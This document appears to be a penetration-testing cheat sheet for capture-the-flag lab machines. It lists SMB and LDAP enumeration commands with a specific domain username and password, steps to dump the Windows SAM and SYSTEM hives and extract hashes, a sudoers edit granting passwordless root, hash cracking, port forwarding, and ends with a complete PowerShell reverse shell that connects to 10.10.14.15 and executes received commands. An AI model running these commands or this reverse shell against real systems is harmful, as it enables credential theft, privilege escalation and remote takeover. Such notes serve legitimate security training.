#### SMB:
  * smbclient -N -L //10.10.11.35
  * netexec smb 10.10.11.35 -u 'a' -p '' --shares
  * smbclient -U Guest //10.10.11.35/share
  * netexec smb 10.10.11.35 -u Guest -p '' --rid-brute
  * netexec smb 10.10.11.35 -u username.txt -p 'password123!'

### LDAP:
  * ldapdomaindump 10.10.11.35 -u 'domain\username' -p 'password123!'
  * ldapdomaindump 10.10.11.35 -u 'cicada\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'

#### Powershell:
  * Get-ChildItem -Path C:\ -Recurse -Filter "user.txt" -ErrorAction SilentlyContinue

#### System SAM Hive dump:
  * cd c:\
  * mkdir Temp
  * reg save hklm\sam c:\Temp\sam
  * reg save hklm\system c:\Temp\system
  * cd Temp
  * download sam
  * download system
  * pypykatz registry --sam sam system

#### Subdomain Enumeration:
  * ffuf -u http://permx.htb -H "Host:FUZZ.permx.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18

#### Directory Enumeration
  * gobuster dir -u http://lms.permx.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

#### Symlink Techniques:
  * ln -s /etc/sudoers /home/john/sudoerss

#### Manipulating sudoers file:
  * vi /etc/sudoers
    * john ALL=(ALL:ALL) NOPASSWD: ALL
   
#### Hash cracking:
  * john john.hash -w=/usr/share/wordlists/rockyou.txt

#### SSH local port forwarding:
  * Service in running on victim machine 127.0.0.1:8080 and can only be accessed via localhost
    * kali-Attacker$ ssh -L 0.0.0.0:9999:127.0.0.1:PORT john@VICTIM-IP
    * kali-Attacker$ curl -I http://127.0.0.1:9999
   
#### Exploiting Chrome Debugger:
  * https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/

#### Powershell Reverse shell:
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
